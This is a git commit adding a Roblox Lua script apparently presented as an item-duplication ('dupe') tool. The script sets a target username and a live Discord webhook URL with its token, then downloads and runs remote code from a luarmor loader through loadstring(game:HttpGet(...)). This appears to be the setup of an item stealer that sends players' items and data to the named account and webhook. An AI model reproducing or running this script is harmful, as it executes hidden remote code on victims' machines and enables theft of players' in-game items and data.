edc72be0c509875dc78830f0154b87b9c8244f53
sab-api <carlosignaa2019@gmail.com>
2026-08-11 07:11:49 -0400

    Add script Dupesoanw_1786446709523.lua

---
+++ scripts/Dupesoanw_1786446709523.lua
@@ -0,0 +1,10 @@
+-- Mode: NORMAL
+getgenv().TARGET_USERNAME = "nothing_67854"
+getgenv().WEBHOOK_URL = "https://discord.com/api/webhooks/1533385701226450994/3HfHJ3aEYik0qH7Ce-sEbk-JWcLVyQ9Bh-zwP2ksPqsj1Kt4hHyWKAy0loOUYJ8Q6m1y"
+getgenv().NORMAL_BRAINROTS = {}
+getgenv().NORMAL_BASE_SKINS = {}
+getgenv().NORMAL_GEARS = {}
+
+task.spawn(function()
+    loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/870375c8dfbc1d6521073674fe460cb6.lua"))()
+end)
